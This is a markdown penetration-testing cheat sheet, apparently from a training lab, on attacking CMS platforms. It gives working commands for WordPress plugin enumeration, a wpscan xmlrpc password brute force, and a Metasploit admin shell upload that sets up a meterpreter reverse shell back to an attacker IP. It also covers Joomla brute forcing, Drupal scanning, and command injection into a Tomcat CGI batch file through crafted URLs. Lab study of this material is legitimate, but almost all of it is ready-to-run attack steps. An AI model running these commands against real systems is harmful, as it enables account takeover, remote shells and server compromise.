#

# CMS

## WordPress

To find plugin versions , ex : wp-sitemap-page  
`http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt`

`curl http://blog.inlanefreight.local/?p=1 | grep plugin`  
`curl http://blog.inlanefreight.local | grep plugin`

**wpscan**

The tool uses two kinds of login brute force attacks, `xmlrpc` and `wp-login`.  
The `wp-login` method will attempt to brute force the standard WordPress login page, while the `xmlrpc` method uses WordPress API to make login attempts through /xmlrpc.php.  
***The `xmlrpc` method is preferred as it’s faster.***

```
wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

### Code Execution

```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

## Joomla

### Enumeration

[droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.  

```
droopescan scan joomla --url http://dev.inlanefreight.local/
```

### Brute Force

[joomla-brute.py](https://github.com/ajnik/joomla-bruteforce)
```
python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Drupal

### Enumeration

```
droopescan scan drupal -u http://drupal.inlanefreight.local
```

## Attacking Tomcat CGI

### Fuzzing Extentions - .CMD

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

### Fuzzing Extentions - .BAT

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

### Enumeration - Gobuster

```
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

### Exploitation 
```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```
```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```
```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

